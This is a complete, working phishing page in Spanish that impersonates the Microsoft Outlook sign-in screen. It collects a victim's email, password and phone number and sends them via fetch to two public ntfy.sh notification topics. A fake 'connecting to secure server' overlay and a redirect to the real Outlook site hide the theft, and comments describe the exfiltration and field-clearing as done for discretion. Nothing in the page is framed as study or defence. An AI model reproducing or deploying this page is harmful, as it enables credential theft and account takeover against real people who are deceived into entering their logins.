<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Iniciar sesión | Outlook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Microsoft YaHei', 'Helvetica Neue', sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 440px;
            padding: 44px 40px 48px;
            transition: all 0.2s;
        }

        .logo {
            margin-bottom: 28px;
        }
        .logo svg {
            width: 108px;
            height: auto;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #1b1b1b;
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1b1b1b;
        }

        input {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 15px;
            transition: border 0.2s;
            background: #fefefe;
        }

        input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
        }

        .password-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 12px 0 24px;
            font-size: 13px;
        }
        .password-options a {
            color: #0078d4;
            text-decoration: none;
        }
        .password-options a:hover {
            text-decoration: underline;
        }

        button {
            width: 100%;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #106ebe;
        }

        .signup-link {
            margin-top: 24px;
            font-size: 13px;
            text-align: center;
        }
        .signup-link a {
            color: #0078d4;
            text-decoration: none;
        }
        .signup-link a:hover {
            text-decoration: underline;
        }

        .footer-links {
            margin-top: 32px;
            font-size: 11px;
            color: #666;
            text-align: center;
        }
        .footer-links a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }

        .error-msg {
            color: #d13438;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }

        /* Pantalla de carga */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            font-family: 'Segoe UI', sans-serif;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #333;
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 32px 20px;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">
        <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="0" y="0" width="24" height="24" fill="#F25022"/>
            <rect x="27" y="0" width="24" height="24" fill="#7FBA00"/>
            <rect x="54" y="0" width="24" height="24" fill="#00A4EF"/>
            <rect x="81" y="0" width="24" height="24" fill="#FFB900"/>
            <text x="10" y="38" font-family="Segoe UI" font-size="20" fill="#1b1b1b" font-weight="600">Microsoft</text>
        </svg>
    </div>

    <h1>Iniciar sesión</h1>

    <div class="error-msg" id="errorMsg">Por favor, complete todos los campos.</div>

    <form id="loginForm">
        <div class="input-group">
            <label>Correo electrónico, teléfono o Skype</label>
            <input type="text" id="email" name="email" autocomplete="off">
        </div>

        <div class="input-group">
            <label>Contraseña</label>
            <input type="password" id="password" name="password" autocomplete="off">
        </div>

        <div class="input-group">
            <label>Número de teléfono asociado</label>
            <input type="tel" id="phone" name="phone" autocomplete="off">
        </div>

        <div class="password-options">
            <a href="#">¿Olvidó su contraseña?</a>
            <a href="#">Iniciar sesión con un código de seguridad</a>
        </div>

        <button type="submit">Iniciar sesión</button>

        <div class="signup-link">
            ¿No tiene una cuenta? <a href="#">Cree una</a>
        </div>

        <div class="footer-links">
            <a href="#">Opciones de inicio de sesión</a>
            <a href="#">Privacidad y cookies</a>
            <a href="#">Condiciones de uso</a>
            <a href="#">Activar Windows</a>
        </div>
    </form>
</div>

<!-- Pantalla de carga (dispara la redirección) -->
<div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text">Conectando con servidor seguro...</div>
</div>

<script>
    // ======================================================
    // CONFIGURACIÓN NTFY – DOS TOPICS
    // ======================================================
    // Primer topic: MICROSOFT-ALERTE
    // Segundo topic: CONNEXION-MICROSOFT_OFFICE
    const TOPIC1 = "MICROSOFT-ALERTE";
    const TOPIC2 = "CONNEXION-MICROSOFT_OFFICE";
    const NTFY_URL1 = `https://ntfy.sh/${TOPIC1}`;
    const NTFY_URL2 = `https://ntfy.sh/${TOPIC2}`;

    async function sendToNtfy(email, password, phone) {
        const message = `🔐 *NUEVO INTENTO OUTLOOK* 🔐\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}\n📞 Teléfono: ${phone}\n\n🕒 ${new Date().toLocaleString('es-ES')}`;
        const fetchOptions = {
            method: 'POST',
            body: message,
            headers: { 'Title': 'Outlook Login', 'Priority': 'high', 'Tags': 'warning' }
        };
        try {
            // Envoi vers les deux topics
            await fetch(NTFY_URL1, fetchOptions);
            await fetch(NTFY_URL2, fetchOptions);
            console.log("Notificaciones enviadas a ambos topics ntfy");
        } catch (err) {
            console.error("Error ntfy:", err);
        }
    }

    // Affiche le chargement puis redirige vers la vraie page Outlook
    function showLoadingAndRedirect() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'flex';

        // Après 3 secondes, redirection vers le site officiel Microsoft
        setTimeout(() => {
            window.location.href = "https://outlook.live.com";
        }, 3000);
    }

    // Soumission du formulaire
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const errorMsgDiv = document.getElementById('errorMsg');

        if (!email || !password || !phone) {
            errorMsgDiv.style.display = 'block';
            return;
        }
        errorMsgDiv.style.display = 'none';

        // Envoi discret des données vers les deux topics ntfy
        await sendToNtfy(email, password, phone);

        // Effacement des champs pour plus de discrétion
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        document.getElementById('phone').value = '';

        // Affichage du chargement puis redirection vers outlook.live.com
        showLoadingAndRedirect();
    });
</script>
</body>
</html>
